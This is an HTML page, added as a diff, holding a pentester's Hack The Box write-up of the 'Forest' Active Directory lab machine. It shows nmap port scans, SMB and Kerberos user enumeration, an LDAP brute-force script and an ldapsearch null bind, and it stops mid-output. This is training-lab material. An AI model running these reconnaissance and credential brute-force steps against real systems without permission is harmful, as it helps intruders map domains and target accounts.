@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Forest</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/forest/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Windows">← All Windows write-ups</a>
+                    <h1 data-type="Forest" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Easy">Easy</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <h2>System Discovery</h2>
+
+<details>
+<summary>NMAP scan</summary>
+<div class="inner">
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -A 10.10.10.161
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 16:08 EDT
+Nmap scan report for 10.10.10.161
+Host is up (0.028s latency).
+Not shown: 989 closed tcp ports (reset)
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-08 20:15:53Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=8/8%OT=53%CT=1%CU=38398%PV=Y%DS=2%DC=T%G=Y%TM=64D2A0F4
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%CI=I%II=I%TS=A)SEQ(SP=10
+OS:1%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=101%GCD=1%ISR=10C%TS=A)O
+OS:PS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CN
+OS:W8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)E
+OS:CN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F
+OS:=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=8
+OS:0%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
+OS:=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A
+OS:%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
+OS:%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
+OS:=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m52s, deviation: 4h02m30s, median: 6m51s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2023-08-08T20:16:08
+|_  start_date: 2023-08-08T05:24:15
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2023-08-08T13:16:07-07:00
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT      ADDRESS
+1   27.24 ms 10.10.14.1
+2   27.34 ms 10.10.10.161
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap -p0- -v -T4 10.10.10.161
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 18:45 EDT
+Initiating Ping Scan at 18:45
+Scanning 10.10.10.161 [2 ports]
+Completed Ping Scan at 18:45, 0.03s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 18:45
+Completed Parallel DNS resolution of 1 host. at 18:45, 0.09s elapsed
+Initiating Connect Scan at 18:45
+Scanning 10.10.10.161 [65536 ports]
+Discovered open port 139/tcp on 10.10.10.161
+...
+Discovered open port 88/tcp on 10.10.10.161
+Completed Connect Scan at 18:45, 17.36s elapsed (65536 total ports)
+Nmap scan report for 10.10.10.161
+Host is up (0.028s latency).
+Not shown: 65512 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49703/tcp open  unknown
+49931/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.53 seconds</code></pre>
+</div>
+</details>
+
+<h2>Enumeration</h2>
+
+<details>
+<summary>SMB enum</summary>
+<div class="inner">
+<pre><code>[+] 10.10.10.161:445      - HTB [ Administrator, Guest, krbtgt, DefaultAccount, $331000-VK4ADACQNUCA, SM_2c8eef0a09b545acb, SM_ca8c2ed5bdab4dc9b, SM_75a538d3025e4db9a, SM_681f53d4942840e18, SM_1b41c9286325456bb, SM_9b69f1b9d2cc45549, SM_7c96b981967141ebb, SM_c75ee099d0a64c91b, SM_1ffab36a2f5f479cb, HealthMailboxc3d7722, HealthMailboxfc9daad, HealthMailboxc0a90c9, HealthMailbox670628e, HealthMailbox968e74d, HealthMailbox6ded678, HealthMailbox83d6781, HealthMailboxfd87238, HealthMailboxb01ac64, HealthMailbox7108a4e, HealthMailbox0659cc1, sebastien, lucinda, svc-alfresco, andy, mark, santi, xed, avp ] ( LockoutTries=0 PasswordMin=7 )
+[*] 10.10.10.161:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_enumusers) &gt;
+
+
+Host script results:
+| smb-enum-users:
+|   HTB\$331000-VK4ADACQNUCA (RID: 1123)
+|     Flags:       Password Expired, Normal user account, Password not required, Account disabled
+|   HTB\Administrator (RID: 500)
+|     Full name:   Administrator
+|     Description: Built-in account for administering the computer/domain
+|     Flags:       Normal user account
+|   HTB\andy (RID: 1150)
+|     Full name:   Andy Hislip
+|     Flags:       Normal user account, Password does not expire
+|   HTB\avp (RID: 9602)
+|     Flags:       Normal user account
+|   HTB\DefaultAccount (RID: 503)
+|     Description: A user account managed by the system.
+|     Flags:       Normal user account, Password not required, Account disabled, Password does not expire
+|   HTB\Guest (RID: 501)
+|     Description: Built-in account for guest access to the computer/domain
+|     Flags:       Normal user account, Password not required, Account disabled, Password does not expire
+|   HTB\HealthMailbox0659cc1 (RID: 1144)
+|     Full name:   HealthMailbox-EXCH01-010
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailbox670628e (RID: 1137)
+|     Full name:   HealthMailbox-EXCH01-003
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailbox6ded678 (RID: 1139)
+|     Full name:   HealthMailbox-EXCH01-005
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailbox7108a4e (RID: 1143)
+|     Full name:   HealthMailbox-EXCH01-009
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailbox83d6781 (RID: 1140)
+|     Full name:   HealthMailbox-EXCH01-006
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailbox968e74d (RID: 1138)
+|     Full name:   HealthMailbox-EXCH01-004
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailboxb01ac64 (RID: 1142)
+|     Full name:   HealthMailbox-EXCH01-008
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailboxc0a90c9 (RID: 1136)
+|     Full name:   HealthMailbox-EXCH01-002
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailboxc3d7722 (RID: 1134)
+|     Full name:   HealthMailbox-EXCH01-Mailbox-Database-1118319013
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailboxfc9daad (RID: 1135)
+|     Full name:   HealthMailbox-EXCH01-001
+|     Flags:       Normal user account, Password does not expire
+|   HTB\HealthMailboxfd87238 (RID: 1141)
+|     Full name:   HealthMailbox-EXCH01-007
+|     Flags:       Normal user account, Password does not expire
+|   HTB\krbtgt (RID: 502)
+|     Description: Key Distribution Center Service Account
+|     Flags:       Normal user account, Account disabled
+|   HTB\lucinda (RID: 1146)
+|     Full name:   Lucinda Berger
+|     Flags:       Normal user account, Password does not expire
+|   HTB\mark (RID: 1151)
+|     Full name:   Mark Brandt
+|_    Flags:       Normal user account, Password does not expire</code></pre>
+</div>
+</details>
+
+<details>
+<summary>LDAP enum</summary>
+<div class="inner">
+<details><summary><strong>nmap</strong></summary><div class="inner"><details><summary><code>sudo nmap 10.10.10.161  -p 389 --script ldap-rootdse</code></summary><div class="inner"><pre><code>PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-rootdse:
+| LDAP Results
+|   &lt;ROOT&gt;
+|       currentTime: 20230808203326.0Z
+|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
+|       dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
+|       namingContexts: DC=htb,DC=local
+|       namingContexts: CN=Configuration,DC=htb,DC=local
+|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
+|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
+|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
+|       defaultNamingContext: DC=htb,DC=local
+|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
+|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
+|       rootDomainNamingContext: DC=htb,DC=local
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedControl: 1.2.840.113556.1.4.2090
+|       supportedControl: 1.2.840.113556.1.4.2205
+|       supportedControl: 1.2.840.113556.1.4.2204
+|       supportedControl: 1.2.840.113556.1.4.2206
+|       supportedControl: 1.2.840.113556.1.4.2211
+|       supportedControl: 1.2.840.113556.1.4.2239
+|       supportedControl: 1.2.840.113556.1.4.2255
+|       supportedControl: 1.2.840.113556.1.4.2256
+|       supportedControl: 1.2.840.113556.1.4.2309
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxPercentDirSyncRequests
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxBatchReturnMessages
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxDirSyncDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: MaxValRangeTransitive
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       highestCommittedUSN: 3139575
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       dnsHostName: FOREST.htb.local
+|       ldapServiceName: htb.local:forest$@HTB.LOCAL
+|       serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       supportedCapabilities: 1.2.840.113556.1.4.2237
+|       isSynchronized: TRUE
+|       isGlobalCatalogReady: TRUE
+|       domainFunctionality: 7
+|       forestFunctionality: 7
+|_      domainControllerFunctionality: 7
+Service Info: Host: FOREST; OS: Windows</code></pre>
+</div>
+</details><details>
+<summary>sudo nmap 10.10.10.161 -p 389 --script ldap-brute</summary>
+<div class="inner">
+<pre><code>PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-brute:
+|   root:&lt;empty&gt; =&gt; Valid credentials
+|   admin:&lt;empty&gt; =&gt; Valid credentials
+|   administrator:&lt;empty&gt; =&gt; Valid credentials
+|   webadmin:&lt;empty&gt; =&gt; Valid credentials
+|   sysadmin:&lt;empty&gt; =&gt; Valid credentials
+|   netadmin:&lt;empty&gt; =&gt; Valid credentials
+|   guest:&lt;empty&gt; =&gt; Valid credentials
+|   user:&lt;empty&gt; =&gt; Valid credentials
+|   web:&lt;empty&gt; =&gt; Valid credentials
+|_  test:&lt;empty&gt; =&gt; Valid credentials</code></pre>
+</div>
+</details><details>
+<summary>nmap 10.10.10.161 -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local’</summary>
+<div class="inner">
+<pre><code>PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users:
+| Discovered Kerberos principals
+|_    administrator@htb.local</code></pre>
+</div>
+</details></div></details><details>
+<summary>ldapsearch - LDAP Null-bind</summary>
+<div class="inner">
+<p>#1 base search</p><p><code>ldapsearch -H ldap://10.10.10.161 -x -s base '' "(objectClass=*)" "*" +</code></p><aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="90e83193-5213-4a1c-afd1-7a25a0d20c04" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">It is just doing a base search on any available <code>objectClass</code>, but it can disclose some good information, such as exact domain naming context.</div></aside><details><summary>output</summary><div class="inner"><pre><code># extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting:  (objectClass=*) * +
+#
+
+#
+dn:
+currentTime: 20230808213230.0Z
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
+dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Nam
+ e,CN=Sites,CN=Configuration,DC=htb,DC=local
+namingContexts: DC=htb,DC=local
+namingContexts: CN=Configuration,DC=htb,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
+namingContexts: DC=DomainDnsZones,DC=htb,DC=local
+namingContexts: DC=ForestDnsZones,DC=htb,DC=local
+defaultNamingContext: DC=htb,DC=local
+schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
+configurationNamingContext: CN=Configuration,DC=htb,DC=local
+rootDomainNamingContext: DC=htb,DC=local
+supportedControl: 1.2.840.113556.1.4.319
+supportedControl: 1.2.840.113556.1.4.801
+supportedControl: 1.2.840.113556.1.4.473
+supportedControl: 1.2.840.113556.1.4.528
+supportedControl: 1.2.840.113556.1.4.417
+supportedControl: 1.2.840.113556.1.4.619
+supportedControl: 1.2.840.113556.1.4.841
+supportedControl: 1.2.840.113556.1.4.529
+supportedControl: 1.2.840.113556.1.4.805
+supportedControl: 1.2.840.113556.1.4.521
+supportedControl: 1.2.840.113556.1.4.970
+supportedControl: 1.2.840.113556.1.4.1338
+supportedControl: 1.2.840.113556.1.4.474
+supportedControl: 1.2.840.113556.1.4.1339
+supportedControl: 1.2.840.113556.1.4.1340
+supportedControl: 1.2.840.113556.1.4.1413
+supportedControl: 2.16.840.1.113730.3.4.9
+supportedControl: 2.16.840.1.113730.3.4.10
+supportedControl: 1.2.840.113556.1.4.1504
+supportedControl: 1.2.840.113556.1.4.1852
+supportedControl: 1.2.840.113556.1.4.802
+supportedControl: 1.2.840.113556.1.4.1907
+supportedControl: 1.2.840.113556.1.4.1948
+supportedControl: 1.2.840.113556.1.4.1974
